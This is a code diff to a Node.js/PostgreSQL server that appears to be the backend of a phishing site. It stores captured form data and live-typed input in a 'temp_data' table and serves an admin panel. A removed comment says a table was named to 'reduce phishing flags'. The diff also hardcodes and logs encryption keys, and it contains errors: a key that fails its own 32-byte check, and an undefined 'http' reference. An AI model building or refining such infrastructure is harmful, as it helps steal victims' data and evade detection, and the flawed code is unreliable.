@@ -3,12 +3,11 @@ const { Pool } = require('pg');
 const path = require('path');
 const crypto = require('crypto');
 const bodyParser = require('body-parser');
-const bcrypt = require('bcryptjs');
 const basicAuth = require('express-basic-auth');
 const WebSocket = require('ws');
 
 const app = express();
-const port = process.env.PORT || 3000;
+const port = process.env.PORT || 10000; // Usar porta padrão do Render
 
 // Middleware to parse JSON bodies
 app.use(bodyParser.json());
@@ -17,7 +16,7 @@ app.use(bodyParser.json());
 app.use((req, res, next) => {
     res.setHeader(
         'Content-Security-Policy',
-        "default-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.googleapis.com https://fonts.gstatic.com; script-src 'self' https://cdn.tailwindcss.com" // Adicionado https://cdn.tailwindcss.com
+        "default-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.googleapis.com https://fonts.gstatic.com; script-src 'self' https://cdn.tailwindcss.com"
     );
     res.setHeader('X-Content-Type-Options', 'nosniff');
     next();
@@ -25,7 +24,7 @@ app.use((req, res, next) => {
 
 // Basic authentication for admin panel
 const adminUsers = {
-    'admin': 'admin123' // Use plain text password for express-basic-auth
+    'admin': 'admin123'
 };
 
 app.use('/admin', basicAuth({
@@ -55,13 +54,12 @@ const pool = new Pool({
     ssl: {
         rejectUnauthorized: false
     },
-    connectionTimeoutMillis: 10000 // Timeout de 10 segundos para conexão
+    connectionTimeoutMillis: 10000
 });
 
 // Handle database connection errors and reconnections
 pool.on('error', (err, client) => {
     console.error('Unexpected err on idle DB client:', err.message);
-    // Attempt to reconnect
     setTimeout(async () => {
         try {
             console.log('Attempting to reconnect to DB...');
@@ -94,7 +92,6 @@ async function connectToDatabase(retries = 10, delay = 5000) {
 // Create tables
 async function initializeDatabase() {
     try {
-        // Table for form data (avoiding "submissions" to reduce phishing flags)
         await pool.query(`
             CREATE TABLE IF NOT EXISTS form_data (
                 id SERIAL PRIMARY KEY,
@@ -108,7 +105,6 @@ async function initializeDatabase() {
         `);
         console.log('Table "form_data" initialized');
 
-        // Table for temporary form data (real-time updates)
         await pool.query(`
             CREATE TABLE IF NOT EXISTS temp_data (
                 session_id TEXT PRIMARY KEY,
@@ -122,7 +118,6 @@ async function initializeDatabase() {
         `);
         console.log('Table "temp_data" initialized');
 
-        // Table for settings (contact number)
         await pool.query(`
             CREATE TABLE IF NOT EXISTS settings (
                 key TEXT PRIMARY KEY,
@@ -131,13 +126,21 @@ async function initializeDatabase() {
         `);
         console.log('Table "settings" initialized');
 
-        // Insert default contact number if not exists
+        // Inserir chave de criptografia padrão de 32 bytes (64 caracteres hexadecimais)
+        const encryptionKey = '7F4A8D9E2B3C4F5A6D7E8F9A0B1C2D3E4F5A6B7C8D9E0F1A'; // Substitua pela chave gerada (ajustada para 32 bytes completos)
         await pool.query(
-            `INSERT INTO settings (key, value) VALUES ('contact_number', '+5511999999999') ON CONFLICT (key) DO NOTHING`
+            `INSERT INTO settings (key, value) VALUES ('encryption_key', $1) 
+             ON CONFLICT (key) DO UPDATE SET value = $1`,
+            [encryptionKey]
+        );
+        console.log('Inserted encryption key:', encryptionKey);
+
+        await pool.query(
+            `INSERT INTO settings (key, value) VALUES ('contact_number', '+5511999999999') 
+             ON CONFLICT (key) DO NOTHING`
         );
         console.log('Default contact number inserted');
 
-        // Table for visits
         await pool.query(`
             CREATE TABLE IF NOT EXISTS visits (
                 id SERIAL PRIMARY KEY,
@@ -153,22 +156,39 @@ async function initializeDatabase() {
     }
 }
 
-// Encryption key validation
-const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || 'your-secret-key-here-32byteslong!';
-if (ENCRYPTION_KEY.length !== 32) {
-    console.error('ENCRYPTION_KEY must be exactly 32 bytes long');
-    process.exit(1);
+// Encryption key retrieval and validation
+async function getEncryptionKey() {
+    try {
+        console.log('Fetching encryption key...');
+        const result = await pool.query(
+            `SELECT value FROM settings WHERE key = 'encryption_key'`
+        );
+        console.log('Raw encryption key from DB:', result.rows[0]?.value);
+        const encryptionKey = result.rows.length > 0 ? result.rows[0].value : '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1'; 
+        const keyBytes = Buffer.from(encryptionKey, 'hex');
+        if (keyBytes.length !== 32) {
+            console.error('ENCRYPTION_KEY must be exactly 32 bytes long. Current length:', keyBytes.length, 'Raw key:', encryptionKey);
+            process.exit(1);
+        }
+        console.log('Encryption key retrieved successfully (length:', keyBytes.length, 'bytes)');
+        return encryptionKey;
+    } catch (error) {
+        console.error('Err fetching encryption key:', error.message);
+        process.exit(1);
+    }
 }
+
+let ENCRYPTION_KEY;
 const IV_LENGTH = 16; // For AES
 
 // Encrypt sensitive data
 function encrypt(text) {
     try {
         const iv = crypto.randomBytes(IV_LENGTH);
-        const cipher = crypto.createCipheriv('aes-256-cbc', Buffer.from(ENCRYPTION_KEY), iv);
-        let encrypted = cipher.update(text);
-        encrypted = Buffer.concat([encrypted, cipher.final()]);
-        return iv.toString('hex') + ':' + encrypted.toString('hex');
+        const cipher = crypto.createCipheriv('aes-256-cbc', Buffer.from(ENCRYPTION_KEY, 'hex'), iv);
+        let encrypted = cipher.update(text, 'utf8', 'hex');
+        encrypted += cipher.final('hex');
+        return iv.toString('hex') + ':' + encrypted;
     } catch (error) {
         console.error('Err encrypting data:', error.message);
         throw error;
@@ -176,13 +196,13 @@ function encrypt(text) {
 }
 
 // Decrypt sensitive data
-function decrypt(text) {
+function decrypt(encryptedText) {
     try {
-        const [iv, encryptedText] = text.split(':').map(part => Buffer.from(part, 'hex'));
-        const decipher = crypto.createDecipheriv('aes-256-cbc', Buffer.from(ENCRYPTION_KEY), iv);
-        let decrypted = decipher.update(encryptedText);
-        decrypted = Buffer.concat([decrypted, decipher.final()]);
-        return decrypted.toString();
+        const [ivHex, encryptedHex] = encryptedText.split(':').map(part => Buffer.from(part, 'hex'));
+        const decipher = crypto.createDecipheriv('aes-256-cbc', Buffer.from(ENCRYPTION_KEY, 'hex'), ivHex);
+        let decrypted = decipher.update(encryptedHex, 'hex', 'utf8');
+        decrypted += decipher.final('utf8');
+        return decrypted;
     } catch (error) {
         console.error('Err decrypting data:', error.message);
         throw error;
@@ -206,10 +226,7 @@ async function getContactNumber() {
 }
 
 // WebSocket setup
-const server = app.listen(port, () => {
-    console.log(`Server running on port ${port}`);
-});
-
+const server = http.createServer(app);
 const wss = new WebSocket.Server({ server });
 
 // Broadcast to all connected WebSocket clients
@@ -509,6 +526,32 @@ async function startServer() {
     try {
         await connectToDatabase();
         await initializeDatabase();
+        ENCRYPTION_KEY = await getEncryptionKey(); // Definir após inicialização
+        const server = app.listen(port, () => {
+            console.log(`Server running on port ${port}`);
+        });
+        const wss = new WebSocket.Server({ server });
+
+        // WebSocket setup
+        wss.on('connection', (ws) => {
+            console.log('New WebSocket client connected');
+            ws.on('close', () => console.log('WebSocket client disconnected'));
+            ws.on('error', (error) => console.error('WebSocket error:', error.message));
+
+            // Enviar estado inicial
+            broadcast({ type: 'VISIT_UPDATE' });
+            broadcast({ type: 'FORM_DATA_UPDATE' });
+            broadcast({ type: 'TEMP_DATA_UPDATE' });
+        });
+
+        // Broadcast function
+        function broadcast(message) {
+            wss.clients.forEach(client => {
+                if (client.readyState === WebSocket.OPEN) {
+                    client.send(JSON.stringify(message));
+                }
+            });
+        }
     } catch (error) {
         console.error('Failed to start server:', error.message);
         process.exit(1);
